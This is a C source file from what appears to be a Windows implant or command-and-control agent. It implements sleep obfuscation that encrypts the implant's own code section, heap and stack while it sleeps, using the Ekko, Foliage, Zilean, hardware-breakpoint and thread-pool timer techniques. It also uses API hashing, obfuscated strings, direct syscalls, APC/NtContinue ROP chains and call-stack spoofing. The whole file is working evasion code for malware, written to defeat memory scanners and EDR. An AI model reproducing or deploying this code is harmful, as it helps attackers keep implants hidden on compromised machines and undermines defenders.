#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <winternl.h>
#include "../../include/config.h"
#include "../../include/evasion.h"
#include "../../include/iat_obf.h"
#include "../../include/obfuscate.h"
#include "../../include/syscalls.h"
#include "../../include/sleep_stub.h"
#include "../../include/tracked_alloc.h"

static BOOL sleep_protect(PVOID addr, SIZE_T size, ULONG prot, PULONG old) {
    return jager_protect_memory(GetCurrentProcess(), addr, size, prot, old);
}

/* --- Image .text tracking --- */
static PVOID g_text_base = NULL;
static DWORD g_text_size = 0;

/* XOR / RC4 key material for sleep encryption */
static BYTE g_xor_key[16] = {0};

static void generate_key(void);

/* Per-sleep-cycle encryption state (heap + stack) */
static BYTE g_sleep_heap_key[16];
static int g_sleep_heap_key_len = 0;

typedef struct {
    void *stack_base;
    SIZE_T stack_size;
    BYTE *stack_copy;
} StackSaveCtx;

static StackSaveCtx g_stack_save = {0};

/*
 * Note: CET (Control-flow Enforcement Technology) shadow stacks
 * prevent return address modification. Stack encryption preserves
 * return addresses but EDR may detect the stack manipulation via
 * shadow stack mismatch on newer CPUs with CET enabled.
 */
static int save_and_encrypt_stack(StackSaveCtx *ctx, BYTE *key, int key_len) {
    NT_TIB *tib = (NT_TIB *)NtCurrentTeb();

    if (!tib || !key || key_len <= 0)
        return -1;

    ctx->stack_base = tib->StackLimit;
    ctx->stack_size = (SIZE_T)((BYTE *)tib->StackBase - (BYTE *)tib->StackLimit);
    if (ctx->stack_size == 0)
        return -1;

    ctx->stack_copy = (BYTE *)HeapAlloc(GetProcessHeap(), 0, ctx->stack_size);
    if (!ctx->stack_copy)
        return -1;

    CopyMemory(ctx->stack_copy, ctx->stack_base, ctx->stack_size);

    {
        SIZE_T safe_zone = 4096;
        if (ctx->stack_size > safe_zone)
            ZeroMemory(ctx->stack_base, ctx->stack_size - safe_zone);
    }

    for (SIZE_T i = 0; i < ctx->stack_size; i++)
        ctx->stack_copy[i] ^= key[i % (SIZE_T)key_len];

    return 0;
}

static void restore_stack(StackSaveCtx *ctx, BYTE *key, int key_len) {
    if (!ctx->stack_copy || !key || key_len <= 0)
        return;

    for (SIZE_T i = 0; i < ctx->stack_size; i++)
        ctx->stack_copy[i] ^= key[i % (SIZE_T)key_len];

    CopyMemory(ctx->stack_base, ctx->stack_copy, ctx->stack_size);

    HeapFree(GetProcessHeap(), 0, ctx->stack_copy);
    ctx->stack_copy = NULL;
    ctx->stack_base = NULL;
    ctx->stack_size = 0;
}

static BOOL generate_sleep_key(BYTE *key, int key_len) {
    if (BCryptGenRandom(NULL, key, (ULONG)key_len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0)
        return TRUE;
    generate_key();
    CopyMemory(key, g_xor_key, (SIZE_T)key_len);
    return TRUE;
}

/* ROP fake stack slots (one per APC frame) */
#define ROP_STACK_SLOTS   8
#define ROP_STACK_SIZE    0x200
static BYTE g_rop_stacks[ROP_STACK_SLOTS][ROP_STACK_SIZE];

typedef struct _SLEEP_APIS {
    fnVirtualProtect         pVirtualProtect;
    fnSystemFunction032      pSystemFunction032;
    fnSetEvent               pSetEvent;
    fnWaitForSingleObject    pWaitForSingleObject;
    fnCreateEventA           pCreateEventA;
    fnCreateTimerQueue       pCreateTimerQueue;
    fnCreateTimerQueueTimer  pCreateTimerQueueTimer;
    fnDeleteTimerQueue       pDeleteTimerQueue;
    fnCreateThread           pCreateThread;
    fnResumeThread           pResumeThread;
    fnCloseHandle            pCloseHandle;
    fnRtlCaptureContext      pRtlCaptureContext;
    fnNtContinue             pNtContinue;
    PVOID                    pNtTestAlert;
    PVOID                    pNtQueueApcThread;
    PVOID                    pRtlExitUserThread;
    fnWaitForSingleObjectEx  pWaitForSingleObjectEx;
    fnCreateWaitableTimerW   pCreateWaitableTimerW;
    fnSetWaitableTimer       pSetWaitableTimer;
} SLEEP_APIS;

typedef struct _SLEEP_CRYPT {
    BYTE  rc4_key[16];
    DWORD old_protect;
    BOOL  use_rc4;
} SLEEP_CRYPT;

static void generate_key(void) {
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    for (int i = 0; i < 16; i++)
        g_xor_key[i] = (BYTE)((counter.QuadPart >> (i * 4)) ^ (i * 0x41));
}

static void xor_memory(PVOID addr, DWORD size, BYTE *key, DWORD key_len) {
    BYTE *ptr = (BYTE *)addr;
    for (DWORD i = 0; i < size; i++)
        ptr[i] ^= key[i % key_len];
}

static BOOL resolve_text_section(void) {
    if (g_text_base && g_text_size)
        return TRUE;

    PVOID module = GetModuleHandleA(NULL);
    if (!module)
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)module + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            g_text_base = (PVOID)((BYTE *)module + section[i].VirtualAddress);
            g_text_size = section[i].Misc.VirtualSize;
            return g_text_size > 0;
        }
    }
    return FALSE;
}

void heap_encrypt_init(void) {
    tracked_alloc_init();
    generate_key();
}

void heap_encrypt(void) {
#if HEAP_ENCRYPT
    g_sleep_heap_key_len = (int)sizeof(g_sleep_heap_key);
    if (!generate_sleep_key(g_sleep_heap_key, g_sleep_heap_key_len))
        return;
    tracked_encrypt_all(g_sleep_heap_key, g_sleep_heap_key_len);
    save_and_encrypt_stack(&g_stack_save, g_sleep_heap_key, g_sleep_heap_key_len);
#endif
}

void heap_decrypt(void) {
#if HEAP_ENCRYPT
    if (g_sleep_heap_key_len <= 0)
        return;
    restore_stack(&g_stack_save, g_sleep_heap_key, g_sleep_heap_key_len);
    tracked_decrypt_all(g_sleep_heap_key, g_sleep_heap_key_len);
    ZeroMemory(g_sleep_heap_key, sizeof(g_sleep_heap_key));
    g_sleep_heap_key_len = 0;
#endif
}

static BOOL sleep_resolve_apis(SLEEP_APIS *api) {
    HMODULE k32 = get_module_by_hash(HASH_KERNEL32_DLL);
    HMODULE adv = get_module_by_hash(HASH_ADVAPI32_DLL);
    HMODULE ntd = get_module_by_hash(HASH_NTDLL_DLL);

    if (!k32)
        k32 = GetModuleHandleA(OBF("kernel32.dll"));
    if (!adv)
        adv = LoadLibraryA(OBF("advapi32.dll"));
    if (!ntd)
        ntd = GetModuleHandleA(OBF("ntdll.dll"));
    if (!k32 || !ntd)
        return FALSE;

    ZeroMemory(api, sizeof(*api));
    api->pVirtualProtect = (fnVirtualProtect)resolve_api(k32, HASH_VirtualProtect);
    api->pSetEvent = (fnSetEvent)resolve_api(k32, HASH_SetEvent);
    api->pWaitForSingleObject = (fnWaitForSingleObject)resolve_api(k32, HASH_WaitForSingleObject);
    api->pCreateEventA = (fnCreateEventA)resolve_api(k32, HASH_CreateEventA);
    api->pCreateTimerQueue = (fnCreateTimerQueue)resolve_api(k32, HASH_CreateTimerQueue);
    api->pCreateTimerQueueTimer = (fnCreateTimerQueueTimer)resolve_api(k32, HASH_CreateTimerQueueTimer);
    api->pDeleteTimerQueue = (fnDeleteTimerQueue)resolve_api(k32, HASH_DeleteTimerQueue);
    api->pCreateThread = (fnCreateThread)resolve_api(k32, HASH_CreateThread);
    api->pResumeThread = (fnResumeThread)resolve_api(k32, HASH_ResumeThread);
    api->pCloseHandle = (fnCloseHandle)resolve_api(k32, HASH_CloseHandle);
    api->pWaitForSingleObjectEx = (fnWaitForSingleObjectEx)resolve_api(k32, HASH_WaitForSingleObjectEx);
    api->pCreateWaitableTimerW = (fnCreateWaitableTimerW)resolve_api(k32, HASH_CreateWaitableTimerW);
    api->pSetWaitableTimer = (fnSetWaitableTimer)resolve_api(k32, HASH_SetWaitableTimer);
    api->pSystemFunction032 = adv ?
        (fnSystemFunction032)resolve_api(adv, HASH_SystemFunction032) : NULL;
    api->pRtlCaptureContext = (fnRtlCaptureContext)resolve_api(ntd, HASH_RtlCaptureContext);
    api->pNtContinue = (fnNtContinue)resolve_api(ntd, HASH_NtContinue);
    api->pNtTestAlert = (PVOID)resolve_api(ntd, HASH_NtTestAlert);
    api->pNtQueueApcThread = (PVOID)resolve_api(ntd, HASH_NtQueueApcThread);
    api->pRtlExitUserThread = (PVOID)resolve_api(ntd, HASH_RtlExitUserThread);

    return api->pVirtualProtect && api->pSetEvent && api->pWaitForSingleObject;
}

static void sleep_init_crypt(SLEEP_CRYPT *crypt) {
    generate_key();
    CopyMemory(crypt->rc4_key, g_xor_key, sizeof(crypt->rc4_key));
    crypt->use_rc4 = FALSE;
    crypt->old_protect = PAGE_EXECUTE_READ;
}

static void sleep_stub_fill_context(SleepStubContext *ctx) {
    if (!ctx)
        return;
    if (!resolve_text_section())
        return;
    if (g_xor_key[0] == 0 && g_xor_key[15] == 0)
        generate_key();
    ctx->text_base = g_text_base;
    ctx->text_size = g_text_size;
    CopyMemory(ctx->xor_key, g_xor_key, sizeof(ctx->xor_key));
    ctx->key_len = (int)sizeof(ctx->xor_key);
}

#define MAX_SUSPEND_THREADS 64
static DWORD g_suspended_tids[MAX_SUSPEND_THREADS];
static DWORD g_suspended_tid_count = 0;

static void sleep_suspend_other_threads(void) {
    DWORD self_tid = GetCurrentThreadId();
    DWORD self_pid = GetCurrentProcessId();
    HANDLE snap;

    g_suspended_tid_count = 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return;

    {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(snap, &te)) {
            do {
                HANDLE ht;

                if (te.th32OwnerProcessID != self_pid)
                    continue;
                if (te.th32ThreadID == self_tid)
                    continue;
                if (g_suspended_tid_count >= MAX_SUSPEND_THREADS)
                    break;

                ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (!ht)
                    continue;
                if (sys_NtSuspendThread(ht, NULL) == STATUS_SUCCESS)
                    g_suspended_tids[g_suspended_tid_count++] = te.th32ThreadID;
                CloseHandle(ht);
            } while (Thread32Next(snap, &te));
        }
    }
    CloseHandle(snap);
}

static void sleep_resume_other_threads(void) {
    DWORD i;

    for (i = 0; i < g_suspended_tid_count; i++) {
        HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, g_suspended_tids[i]);
        if (ht) {
            sys_NtResumeThread(ht, NULL);
            CloseHandle(ht);
        }
    }
    g_suspended_tid_count = 0;
}

static void sleep_crypt_text(SLEEP_APIS *api, SLEEP_CRYPT *crypt) {
    if (!g_text_base || !g_text_size)
        return;

    if (crypt->use_rc4 && api->pSystemFunction032) {
        OBF_USTRING data = {0}, key = {0};
        data.Length = data.MaximumLength = (DWORD)g_text_size;
        data.Buffer = (PUCHAR)g_text_base;
        key.Length = key.MaximumLength = (DWORD)sizeof(crypt->rc4_key);
        key.Buffer = crypt->rc4_key;
        api->pSystemFunction032(&data, &key);
    } else {
        xor_memory(g_text_base, g_text_size, crypt->rc4_key, (DWORD)sizeof(crypt->rc4_key));
    }
}

void sleep_encrypt_text(void) {
    SLEEP_APIS api = {0};
    SLEEP_CRYPT crypt = {0};

    if (!resolve_text_section())
        return;

    sleep_init_crypt(&crypt);
    if (!sleep_resolve_apis(&api))
        return;

    crypt.use_rc4 = (api.pSystemFunction032 != NULL);

    {
        ULONG old = 0;
        sleep_protect(g_text_base, g_text_size, PAGE_READWRITE, &old);
        crypt.old_protect = old ? old : PAGE_EXECUTE_READ;
        sleep_crypt_text(&api, &crypt);
    }
}

void sleep_decrypt_text(void) {
    SLEEP_APIS api = {0};
    SLEEP_CRYPT crypt = {0};

    if (!resolve_text_section())
        return;

    sleep_init_crypt(&crypt);
    if (!sleep_resolve_apis(&api))
        return;

    crypt.use_rc4 = (api.pSystemFunction032 != NULL);
    sleep_crypt_text(&api, &crypt);

    {
        ULONG old = 0;
        sleep_protect(g_text_base, g_text_size,
                      crypt.old_protect ? crypt.old_protect : PAGE_EXECUTE_READ,
                      &old);
    }
}

static void rop_init_context(
    CONTEXT *ctx,
    PVOID rip,
    PVOID ret,
    ULONG64 rcx,
    ULONG64 rdx,
    ULONG64 r8,
    ULONG64 r9,
    BYTE *stack_buf,
    SIZE_T stack_size)
{
    ZeroMemory(ctx, sizeof(*ctx));
    ctx->ContextFlags = CONTEXT_FULL;
    ctx->Rip = (DWORD64)rip;
    ctx->Rcx = rcx;
    ctx->Rdx = rdx;
    ctx->R8 = r8;
    ctx->R9 = r9;
    ctx->Rsp = ((DWORD64)stack_buf + stack_size - 0x30) & ~0xFULL;
    *(ULONG_PTR *)(ULONG_PTR)ctx->Rsp = (ULONG_PTR)ret;
}

typedef NTSTATUS (NTAPI *fnNtQueueApcThread_t)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

static BOOL queue_ctx_apc(
    HANDLE hThread,
    fnNtQueueApcThread_t pQueue,
    fnNtContinue pContinue,
    PCONTEXT pCtx)
{
    if (!pQueue || !pContinue || !pCtx)
        return FALSE;
    return pQueue(hThread, (PVOID)pContinue, (PVOID)pCtx,
                    (PVOID)(ULONG_PTR)FALSE, NULL) == 0;
}

/* --- Ekko (timer queue) --- */
typedef struct _EKKO_CTX {
    HANDLE              hEvent;
    HANDLE              hTimerQueue;
    SLEEP_APIS          api;
    SleepWakeSignalCtx  wake;
} EKKO_CTX;

BOOL sleep_ekko(DWORD ms) {
    if (!resolve_text_section()) {
        Sleep(ms);
        return TRUE;
    }

    EKKO_CTX ctx = {0};
    if (!sleep_resolve_apis(&ctx.api)) {
        Sleep(ms);
        return TRUE;
    }

    if (!ctx.api.pCreateEventA || !ctx.api.pCreateTimerQueue ||
        !ctx.api.pCreateTimerQueueTimer || !ctx.api.pSetEvent) {
        Sleep(ms);
        return TRUE;
    }

    ctx.hEvent = ctx.api.pCreateEventA(NULL, TRUE, FALSE, NULL);
    ctx.hTimerQueue = ctx.api.pCreateTimerQueue();
    if (!ctx.hEvent || !ctx.hTimerQueue) {
        if (ctx.hEvent && ctx.api.pCloseHandle) ctx.api.pCloseHandle(ctx.hEvent);
        if (ctx.hTimerQueue && ctx.api.pDeleteTimerQueue) ctx.api.pDeleteTimerQueue(ctx.hTimerQueue);
        Sleep(ms);
        return TRUE;
    }

    sleep_stub_fill_context(&ctx.wake.crypt);
    ctx.wake.hEvent = ctx.hEvent;
    ctx.wake.pSetEvent = ctx.api.pSetEvent;

    {
        HANDLE ht = NULL;
        ctx.api.pCreateTimerQueueTimer(&ht, ctx.hTimerQueue, sleep_ekko_timer_wake,
                                       &ctx.wake, ms, 0, WT_EXECUTEINTIMERTHREAD);
    }

    sleep_suspend_other_threads();
    sleep_pre_encrypt(&ctx.wake.crypt);

    ctx.api.pWaitForSingleObject(ctx.hEvent, INFINITE);

    sleep_resume_other_threads();

    if (ctx.api.pDeleteTimerQueue)
        ctx.api.pDeleteTimerQueue(ctx.hTimerQueue);
    if (ctx.api.pCloseHandle)
        ctx.api.pCloseHandle(ctx.hEvent);
    return TRUE;
}

/* --- Foliage / Kraken (APC + NtContinue chain on helper thread) --- */
typedef struct _FOLIAGE_CTX {
    HANDLE          hHelper;
    HANDLE          hEvtStart;
    HANDLE          hEvtEnd;
    HANDLE          hEvtWake;
    SLEEP_APIS      api;
    SLEEP_CRYPT     crypt;
    OBF_USTRING     crypt_data;
    OBF_USTRING     crypt_key;
    CONTEXT         rop[5];
    DWORD           sleep_ms;
} FOLIAGE_CTX;

BOOL sleep_foliage(DWORD ms) {
    if (!resolve_text_section()) {
        Sleep(ms);
        return TRUE;
    }

    FOLIAGE_CTX ctx = {0};
    ctx.sleep_ms = ms;
    sleep_init_crypt(&ctx.crypt);
    if (!sleep_resolve_apis(&ctx.api)) {
        Sleep(ms);
        return TRUE;
    }
    ctx.crypt.use_rc4 = (ctx.api.pSystemFunction032 != NULL);

    if (!ctx.api.pCreateThread || !ctx.api.pResumeThread ||
        !ctx.api.pNtQueueApcThread || !ctx.api.pNtContinue ||
        !ctx.api.pNtTestAlert || !ctx.api.pCreateEventA) {
        Sleep(ms);
        return TRUE;
    }

    fnNtQueueApcThread_t pQueue = (fnNtQueueApcThread_t)ctx.api.pNtQueueApcThread;
    PVOID chain_ret = ctx.api.pNtTestAlert;

    ctx.hEvtStart = ctx.api.pCreateEventA(NULL, TRUE, FALSE, NULL);
    ctx.hEvtEnd = ctx.api.pCreateEventA(NULL, TRUE, FALSE, NULL);
    ctx.hEvtWake = ctx.api.pCreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ctx.hEvtStart || !ctx.hEvtEnd || !ctx.hEvtWake)
        goto foliage_fallback;

    ctx.hHelper = ctx.api.pCreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)ctx.api.pNtTestAlert,
        NULL, CREATE_SUSPENDED, NULL);
    if (!ctx.hHelper)
        goto foliage_fallback;
    hwbp_propagate_to_thread(ctx.hHelper);

    /*
     * Encrypt on main thread before APC chain runs — APC targets must live
     * outside implant .text (kernel32/advapi32/ntdll only).
     */
    {
        ULONG old = 0;
        sleep_suspend_other_threads();
        sleep_protect(g_text_base, g_text_size, PAGE_READWRITE, &old);
        ctx.crypt.old_protect = old ? old : PAGE_EXECUTE_READ;
        sleep_crypt_text(&ctx.api, &ctx.crypt);
    }

    ctx.crypt_data.Length = ctx.crypt_data.MaximumLength = (DWORD)g_text_size;
    ctx.crypt_data.Buffer = (PUCHAR)g_text_base;
    ctx.crypt_key.Length = ctx.crypt_key.MaximumLength = (DWORD)sizeof(ctx.crypt.rc4_key);
    ctx.crypt_key.Buffer = ctx.crypt.rc4_key;

    /* APC 0: SetEvent(hEvtStart) — main may enter wait while .text encrypted */
    rop_init_context(&ctx.rop[0],
                     (PVOID)ctx.api.pSetEvent,
                     chain_ret,
                     (ULONG64)ctx.hEvtStart,
                     0, 0, 0,
                     g_rop_stacks[0], ROP_STACK_SIZE);

    /* APC 1: WaitForSingleObject(hEvtWake, sleep_ms) — timed sleep on helper */
    rop_init_context(&ctx.rop[1],
                     (PVOID)ctx.api.pWaitForSingleObject,
                     chain_ret,
                     (ULONG64)ctx.hEvtWake,
                     (ULONG64)ctx.sleep_ms,
                     0, 0,
                     g_rop_stacks[1], ROP_STACK_SIZE);

    /* APC 2: decrypt .text (SystemFunction032 RC4 is self-inverse) */
    if (ctx.crypt.use_rc4 && ctx.api.pSystemFunction032) {
        rop_init_context(&ctx.rop[2],
                         (PVOID)ctx.api.pSystemFunction032,
                         chain_ret,
                         (ULONG64)&ctx.crypt_data,
                         (ULONG64)&ctx.crypt_key,
                         0, 0,
                         g_rop_stacks[2], ROP_STACK_SIZE);
    } else {
        rop_init_context(&ctx.rop[2],
                         (PVOID)ctx.api.pVirtualProtect,
                         chain_ret,
                         (ULONG64)g_text_base,
                         (ULONG64)g_text_size,
                         PAGE_READWRITE,
                         (ULONG64)&ctx.crypt.old_protect,
                         g_rop_stacks[2], ROP_STACK_SIZE);
    }

    /* APC 3: VirtualProtect(.text, RX) */
    rop_init_context(&ctx.rop[3],
                     (PVOID)ctx.api.pVirtualProtect,
                     chain_ret,
                     (ULONG64)g_text_base,
                     (ULONG64)g_text_size,
                     (ULONG64)(ctx.crypt.old_protect ? ctx.crypt.old_protect : PAGE_EXECUTE_READ),
                     (ULONG64)&ctx.crypt.old_protect,
                     g_rop_stacks[3], ROP_STACK_SIZE);

    /* APC 4: SetEvent(hEvtEnd) */
    rop_init_context(&ctx.rop[4],
                     (PVOID)ctx.api.pSetEvent,
                     ctx.api.pRtlExitUserThread ? ctx.api.pRtlExitUserThread : chain_ret,
                     (ULONG64)ctx.hEvtEnd,
                     0, 0, 0,
                     g_rop_stacks[4], ROP_STACK_SIZE);

    for (int i = 0; i < 5; i++) {
        if (!queue_ctx_apc(ctx.hHelper, pQueue, ctx.api.pNtContinue, &ctx.rop[i]))
            goto foliage_fallback;
    }

    ctx.api.pResumeThread(ctx.hHelper);
    ctx.api.pWaitForSingleObject(ctx.hEvtStart, INFINITE);
    ctx.api.pWaitForSingleObject(ctx.hEvtEnd, INFINITE);

    if (!ctx.crypt.use_rc4)
        sleep_crypt_text(&ctx.api, &ctx.crypt);

    sleep_resume_other_threads();

    if (ctx.api.pCloseHandle) {
        ctx.api.pCloseHandle(ctx.hHelper);
        ctx.api.pCloseHandle(ctx.hEvtStart);
        ctx.api.pCloseHandle(ctx.hEvtEnd);
        ctx.api.pCloseHandle(ctx.hEvtWake);
    }
    return TRUE;

foliage_fallback:
    sleep_resume_other_threads();
    {
        ULONG old = 0;
        sleep_protect(g_text_base, g_text_size,
                      ctx.crypt.old_protect ? ctx.crypt.old_protect : PAGE_EXECUTE_READ,
                      &old);
    }
    if (ctx.hHelper && ctx.api.pCloseHandle) ctx.api.pCloseHandle(ctx.hHelper);
    if (ctx.hEvtStart && ctx.api.pCloseHandle) ctx.api.pCloseHandle(ctx.hEvtStart);
    if (ctx.hEvtEnd && ctx.api.pCloseHandle) ctx.api.pCloseHandle(ctx.hEvtEnd);
    if (ctx.hEvtWake && ctx.api.pCloseHandle) ctx.api.pCloseHandle(ctx.hEvtWake);
    return sleep_ekko(ms);
}

/* --- Zilean (waitable timer + alertable wait, no timer queue) --- */
typedef struct _ZILEAN_CTX {
    HANDLE             hTimer;
    SLEEP_APIS         api;
    SleepStubContext   crypt;
} ZILEAN_CTX;

BOOL sleep_zilean(DWORD ms) {
    if (!resolve_text_section()) {
        Sleep(ms);
        return TRUE;
    }

    ZILEAN_CTX ctx = {0};
    if (!sleep_resolve_apis(&ctx.api)) {
        Sleep(ms);
        return TRUE;
    }

    if (!ctx.api.pCreateWaitableTimerW || !ctx.api.pSetWaitableTimer ||
        !ctx.api.pWaitForSingleObjectEx) {
        Sleep(ms);
        return TRUE;
    }

    ctx.hTimer = ctx.api.pCreateWaitableTimerW(NULL, TRUE, NULL);
    if (!ctx.hTimer) {
        Sleep(ms);
        return TRUE;
    }

    sleep_stub_fill_context(&ctx.crypt);

    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)ms * 10000LL;
    ctx.api.pSetWaitableTimer(ctx.hTimer, &due, 0, sleep_zilean_timer_apc,
                              &ctx.crypt, FALSE);

    sleep_suspend_other_threads();
    sleep_pre_encrypt(&ctx.crypt);

    ctx.api.pWaitForSingleObjectEx(ctx.hTimer, INFINITE, TRUE);

    sleep_resume_other_threads();

    if (ctx.api.pCloseHandle)
        ctx.api.pCloseHandle(ctx.hTimer);
    return TRUE;
}

/* --- HWBP-triggered .text encrypt/decrypt around alertable sleep --- */
typedef struct _SLEEP_HWBP_CTX {
    PVOID veh_handle;
    volatile LONG toggle_count;
    volatile LONG encrypted;
    SleepStubContext crypt;
} SLEEP_HWBP_CTX;

static SLEEP_HWBP_CTX g_sleep_hwbp = {0};

BOOL sleep_obfuscate_hwbp(DWORD ms) {
    CONTEXT ctx = {0};
    FARPROC pNtContinue;
    PVOID veh;
    HANDLE hThread = NULL;
    HANDLE hSelf = NULL;
    int dr_slot = -1;

    if (!resolve_text_section()) {
        Sleep(ms);
        return TRUE;
    }

    pNtContinue = GetProcAddress(GetModuleHandleA(OBF("ntdll.dll")), OBF("NtContinue"));
    if (!pNtContinue)
        return sleep_foliage(ms);

    dr_init();
    dr_slot = dr_allocate((void *)pNtContinue, "sleep");
    if (dr_slot < 0)
        return sleep_foliage(ms);

    ZeroMemory(&g_sleep_hwbp, sizeof(g_sleep_hwbp));
    sleep_stub_fill_context(&g_sleep_hwbp.crypt);
    sleep_hwbp_stub_bind(&g_sleep_hwbp.crypt,
                         &g_sleep_hwbp.toggle_count,
                         &g_sleep_hwbp.encrypted);

    veh = AddVectoredExceptionHandler(1, sleep_hwbp_veh_handler);
    if (!veh) {
        dr_release(dr_slot);
        Sleep(ms);
        return TRUE;
    }
    g_sleep_hwbp.veh_handle = veh;

    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                         GetCurrentProcess(), &hSelf, 0, FALSE,
                         DUPLICATE_SAME_ACCESS) || !hSelf) {
        RemoveVectoredExceptionHandler(veh);
        dr_release(dr_slot);
        Sleep(ms);
        return TRUE;
    }
    hThread = hSelf;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (sys_NtGetContextThread(hThread, &ctx) != STATUS_SUCCESS) {
        RemoveVectoredExceptionHandler(veh);
        dr_release(dr_slot);
        CloseHandle(hSelf);
        return sleep_foliage(ms);
    }

    switch (dr_slot) {
    case 0: ctx.Dr0 = (DWORD_PTR)pNtContinue; break;
    case 1: ctx.Dr1 = (DWORD_PTR)pNtContinue; break;
    case 2: ctx.Dr2 = (DWORD_PTR)pNtContinue; break;
    case 3: ctx.Dr3 = (DWORD_PTR)pNtContinue; break;
    default: break;
    }
    ctx.Dr7 = (ctx.Dr7 & ~(0xFULL << (dr_slot * 2))) | (1ULL << (dr_slot * 2));
    ctx.Dr7 &= ~(0xFULL << (16 + dr_slot * 4));
    ctx.Dr6 = 0;
    sys_NtSetContextThread(hThread, &ctx);

    sleep_pre_encrypt(&g_sleep_hwbp.crypt);
    g_sleep_hwbp.encrypted = 1;

    SleepEx(ms, TRUE);

    if (g_sleep_hwbp.encrypted)
        sleep_wake_decrypt(&g_sleep_hwbp.crypt);

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (sys_NtGetContextThread(hThread, &ctx) == STATUS_SUCCESS) {
        switch (dr_slot) {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
        default: break;
        }
        ctx.Dr7 &= ~(1ULL << (dr_slot * 2));
        ctx.Dr6 = 0;
        sys_NtSetContextThread(hThread, &ctx);
    }

    dr_release(dr_slot);
    CloseHandle(hSelf);
    RemoveVectoredExceptionHandler(veh);
    ZeroMemory(&g_sleep_hwbp, sizeof(g_sleep_hwbp));
    return TRUE;
}

/* --- Thread-pool timer sleep (TpAllocTimer) --- */
typedef NTSTATUS (NTAPI *pTpAllocTimer)(
    PTP_TIMER *, PTP_TIMER_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef VOID (NTAPI *pTpSetTimer)(PTP_TIMER, PLARGE_INTEGER, ULONG, ULONG);
typedef VOID (NTAPI *pTpReleaseTimer)(PTP_TIMER);

BOOL sleep_obfuscate_timer(DWORD ms) {
    HANDLE hEvent;
    HMODULE ntdll;
    pTpAllocTimer fnAlloc;
    pTpSetTimer fnSet;
    pTpReleaseTimer fnRelease;
    PTP_TIMER timer = NULL;
    LARGE_INTEGER dueTime;
    SleepWakeSignalCtx wake = {0};

    if (!resolve_text_section()) {
        Sleep(ms);
        return TRUE;
    }

    hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!hEvent) {
        Sleep(ms);
        return TRUE;
    }

    ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    fnAlloc = ntdll ? (pTpAllocTimer)GetProcAddress(ntdll, OBF("TpAllocTimer")) : NULL;
    fnSet = ntdll ? (pTpSetTimer)GetProcAddress(ntdll, OBF("TpSetTimer")) : NULL;
    fnRelease = ntdll ? (pTpReleaseTimer)GetProcAddress(ntdll, OBF("TpReleaseTimer")) : NULL;

    if (!fnAlloc || !fnSet) {
        CloseHandle(hEvent);
        Sleep(ms);
        return TRUE;
    }

    sleep_stub_fill_context(&wake.crypt);
    wake.hEvent = hEvent;
    wake.pSetEvent = SetEvent;

    if (fnAlloc(&timer, sleep_tp_timer_wake, &wake, NULL) != 0 || !timer) {
        CloseHandle(hEvent);
        Sleep(ms);
        return TRUE;
    }

    sleep_pre_encrypt(&wake.crypt);

    dueTime.QuadPart = -(LONGLONG)ms * 10000LL;
    fnSet(timer, &dueTime, 0, 0);
    WaitForSingleObject(hEvent, INFINITE);

    if (fnRelease)
        fnRelease(timer);

    CloseHandle(hEvent);
    return TRUE;
}

/* --- Dispatcher with CFG/CET stack spoofing --- */
static BOOL sleep_dispatch(DWORD ms, DWORD technique) {
    STACK_SPOOF_CTX spoof = {0};
    if (stack_spoof_find_donor(&spoof))
        stack_spoof_apply(&spoof);

    BOOL ok = FALSE;
    switch (technique) {
    case 0:
        Sleep(ms);
        ok = TRUE;
        break;
    case 1:
        ok = sleep_ekko(ms);
        break;
    case 2:
        ok = sleep_foliage(ms);
        break;
    case 3:
        ok = sleep_zilean(ms);
        break;
    case 4:
        ok = sleep_obfuscate_hwbp(ms);
        break;
    case 5:
        ok = sleep_obfuscate_timer(ms);
        break;
    default:
        ok = sleep_ekko(ms);
        break;
    }

    stack_spoof_restore(&spoof);
    return ok;
}

BOOL sleep_encrypt(DWORD milliseconds) {
    return sleep_dispatch(milliseconds, SLEEP_TECHNIQUE);
}

BOOL sleep_encrypt_technique(DWORD milliseconds, DWORD technique) {
    return sleep_dispatch(milliseconds, technique);
}
